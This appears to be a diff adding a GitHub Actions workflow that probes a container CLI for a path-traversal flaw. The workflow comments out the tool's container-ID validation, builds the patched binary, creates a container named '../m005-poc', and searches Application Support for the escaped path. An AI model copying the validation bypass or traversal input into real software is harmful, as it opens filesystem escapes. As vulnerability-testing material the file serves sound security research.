@@ -1,0 +1,103 @@
+﻿name: M005 container-id traversal probe
+
+on:
+  workflow_dispatch:
+
+jobs:
+  m005-probe:
+    runs-on: macos-26
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Show environment
+        run: |
+          set -x
+          sw_vers
+          uname -a
+          uname -m
+          xcodebuild -version || true
+          swift --version || true
+          pwd
+          ls -la
+
+      - name: Show original validation line
+        run: |
+          set -x
+          grep -n "validEntityName(id)" Sources/ContainerCommands/Container/ContainerCreate.swift || true
+          grep -n "func validEntityName" -A 8 Sources/Services/ContainerAPIService/Client/Utility.swift || true
+
+      - name: Patch CLI-side container ID validation for M005 probe
+        run: |
+          set -x
+          python3 - <<'PY'
+          from pathlib import Path
+
+          p = Path("Sources/ContainerCommands/Container/ContainerCreate.swift")
+          s = p.read_text()
+
+          old = "try Utility.validEntityName(id)"
+          if old not in s:
+              raise SystemExit("validation line not found in ContainerCreate.swift")
+
+          s = s.replace(
+              old,
+              "// M005 probe: bypass CLI-side validation only in this GitHub Actions test\n            // try Utility.validEntityName(id)",
+              1,
+          )
+
+          p.write_text(s)
+          print("patched:", p)
+          PY
+
+          grep -n "M005 probe\|validEntityName(id)" Sources/ContainerCommands/Container/ContainerCreate.swift || true
+
+      - name: Build patched container CLI
+        run: |
+          set -x
+          swift build -c debug --product container
+          .build/debug/container --help | head -80
+
+      - name: Try to start container system
+        continue-on-error: true
+        run: |
+          set -x
+          .build/debug/container system start || true
+          sleep 10
+          .build/debug/container system status || true
+
+      - name: Baseline official-style invalid name check with unpatched source evidence
+        run: |
+          echo "The official CLI source validates container IDs before create:"
+          grep -n "validEntityName(id)" Sources/ContainerCommands/Container/ContainerRun.swift || true
+          grep -n "validEntityName(id)" Sources/ContainerCommands/Container/ContainerCreate.swift || true
+
+      - name: M005 traversal create attempt
+        continue-on-error: true
+        run: |
+          set -x
+          .build/debug/container create --name '../m005-poc' docker.io/library/alpine:latest || true
+
+      - name: Search for M005 artifacts
+        run: |
+          set -x
+          echo "Search under HOME Library/Application Support:"
+          find "$HOME/Library/Application Support" -path '*m005-poc*' -print 2>/dev/null || true
+
+          echo "Search for runtime-configuration.json containing m005-poc:"
+          find "$HOME/Library/Application Support" -name 'runtime-configuration.json' -path '*m005-poc*' -print 2>/dev/null || true
+
+          echo "Canonical realpaths:"
+          python3 - <<'PY'
+          import os, glob
+          base = os.path.expanduser("~/Library/Application Support")
+          for p in glob.glob(base + "/**/*m005-poc*", recursive=True):
+              print("PATH:", p)
+              print("REAL:", os.path.realpath(p))
+          PY
+
+      - name: Show container-related app support tree
+        run: |
+          set -x
+          find "$HOME/Library/Application Support" -maxdepth 4 -iname '*container*' -print 2>/dev/null || true
